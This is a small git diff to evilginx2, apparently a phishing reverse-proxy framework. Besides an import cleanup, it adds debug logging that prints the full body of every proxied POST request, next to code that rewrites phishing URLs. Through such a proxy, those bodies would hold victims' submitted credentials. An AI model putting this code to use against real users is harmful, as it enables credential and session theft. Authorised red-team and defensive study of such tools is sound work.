@@ -42,8 +42,7 @@ import (
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
-
-	log "github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 const (
@@ -666,7 +665,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
-						log.Debug("%s: %s", req.Method, req.URL.Path)
+						httpMethod := strings.ToUpper(req.Method)
+						log.Debug("%s: %s", httpMethod, req.URL.Path)
+						if httpMethod == "POST" {
+							log.Debug("body: %s", body)
+						}
 						contentType := req.Header.Get("Content-type")
 
 						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
